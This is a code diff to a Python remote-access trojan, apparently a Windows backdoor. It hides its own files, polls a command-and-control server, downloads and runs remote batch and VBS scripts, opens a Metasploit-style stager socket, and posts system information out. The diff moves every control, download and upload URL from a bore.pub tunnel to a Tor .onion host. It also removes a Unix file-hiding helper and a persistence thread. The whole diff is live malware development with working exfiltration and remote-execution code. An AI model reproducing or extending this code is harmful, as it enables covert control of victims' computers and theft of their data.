@@ -50,19 +50,17 @@ subprocess.Popen("attrib +h BN.pyw", shell=True)
 #A.daemon = True
 #A.start()
 
-
 def METASPLOIT(): 
   
     actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
     actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)]) 
   
     previous_data = ""
-  
-    while True:
-     url = 'http://bore.pub:6060/Metasploit.php'
-     time.sleep(5)
-     response = requests_session.get(url)
 
+    while True:
+     url = 'http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Metasploit.php'
+     response = requests_session.get(url)
+     time.sleep(10)
      if response.status_code == 200:
         data = response.text.strip()
         if data != previous_data:
@@ -89,7 +87,7 @@ def METASPLOIT():
                     restart_program()
                 elif option == "STARTVBSBAT":
                     os.system("cls")
-                    php_script_url = 'http://bore.pub:6060/Control.php'
+                    php_script_url = 'http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Control.php'
                     home_directory = os.path.expanduser("~")
                     web_page1_path = os.path.join(home_directory, "Script.bat")
                     vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
@@ -98,8 +96,8 @@ def METASPLOIT():
                         if os.path.exists(file_path):
                             os.remove(file_path)
 
-                    url1 = "http://bore.pub:6060/Script.io"
-                    url2 = "http://bore.pub:6060/VBSEX.io"
+                    url1 = "http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Script.io"
+                    url2 = "http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/VBSEX.io"
 
                     download_file(url1, web_page1_path)
                     download_file(url2, vbs_file_path)
@@ -270,7 +268,7 @@ def METASPLOIT():
                            for port in ports_to_try:
                             try:
                               s = socket.socket(2, socket.SOCK_STREAM)
-                              s.connect(('TOR.onion', port))  # Change the URL
+                              s.connect(('/pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion', port))  # Change the URL
 
                               l = struct.unpack('>I', s.recv(4))[0]
                               d = s.recv(1)
@@ -304,7 +302,7 @@ def METASPLOIT():
             print("No new data.")
     else:
         print("Failed to fetch data.")
-    time.sleep(1)
+        time.sleep(1)
 
 
 specific_code_thread = threading.Thread(target=METASPLOIT)
@@ -313,6 +311,7 @@ specific_code_thread.start()
 
 previous_command = None
 previous_files = {}
+
 
 def clear_screen():
     if os.name == 'nt':
@@ -348,26 +347,6 @@ def hide_files_windows(file_paths):
             ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  
     except Exception as e:
         print(f"Error hiding files on Windows: {str(e)}")
-
-def hide_files_unix(file_paths):
-    try:
-        for file_path in file_paths:
-            os.chmod(file_path, 0o400)  
-    except Exception as e:
-        print(f"Error hiding files on Unix-based system: {str(e)}")
-
-def MEATSERVICE():
-    while True:
-        try:
-         print("Running MEATSERVICE...")
-         METASPLOIT()
-         time.sleep(5)
-        except:
-            pass
-
-MEATSERVICE = threading.Thread(target=MEATSERVICE)
-MEATSERVICE.daemon = True  
-MEATSERVICE.start()
 
 def get_system_info():
     try:
@@ -410,8 +389,9 @@ def get_system_info():
         session = requests.Session()
         session.proxies = proxies
 
-        url = "http://bore.pub:6060/Save.php"
+        url = "http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Save.php"
         data = data_to_send
+        time.sleep(10)
         response = requests_session.post(url, data=data)
         print(response.text)
 
@@ -426,8 +406,8 @@ while True:
         def receive_data():
             global previous_command, previous_files
             while True:
-                php_script_url = 'http://bore.pub:6060/Control.php'
-                
+                php_script_url = 'http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Control.php'
+                time.sleep(10)
                 response = requests_session.get(php_script_url)
                 data = response.text.strip()
 
